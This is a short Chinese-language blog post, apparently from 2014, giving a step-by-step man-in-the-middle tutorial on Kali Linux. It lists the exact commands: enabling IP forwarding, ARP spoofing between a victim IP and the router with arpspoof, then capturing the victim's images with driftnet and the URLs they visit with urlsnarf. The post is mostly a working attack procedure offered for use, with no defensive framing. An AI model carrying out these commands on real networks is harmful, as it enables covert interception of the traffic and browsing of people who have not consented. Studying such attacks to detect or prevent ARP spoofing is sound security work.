---
layout: post
title: Kali Linux Man in the Middle Attack
date: 2014-10-18 15:27:31
disqus: y
---

> 使用的是kali linux 发行版

## 开启 Port Frowarding 

把` /proc/sys/net/ipv4/ip_forward` 的值从0改到1

```
# echo '1' > /proc/sys/net/ipv4/ip_forward
```

开启 Port Forwrding 目的是我们机器类似路由的功能, 劫持数据包，处理后, 并转发出去

## 过程 

被攻击者ip:   `192.168.1.3`  
攻击者ip：    `192.168.1.9`  
路由器ip:     `192.168.1.1`  
网卡是:       `wlan0`  

### 0x1

在被攻击者和路由之间设置arp 欺骗

```
# arpspoof -i wlan0 -t 192.168.1.3 192.168.1.1
```

### 0x2

路由捕获的包转发给被攻击者

```
# arpspoof -i wlan0 -t 192.168.1.1 192.168.1.3
```

![arpspoof](http://lidashuang.u.qiniudn.com/2014-10-18%2021%3A49%3A19%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

经过这两步，数据包就会经过我们的机器(192.168.1.9)

可以使用`driftnet`这个工具抓取经过网卡的数据

```
# driftnet -i wlan0
```

效果: 

![driftnet](http://lidashuang.u.qiniudn.com/2014-10-18%2021%3A53%3A02%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)


使用 `urlsnarf` 这个工具可以抓去被攻击者访问url

```
# urlsnarf -i wlan0
```
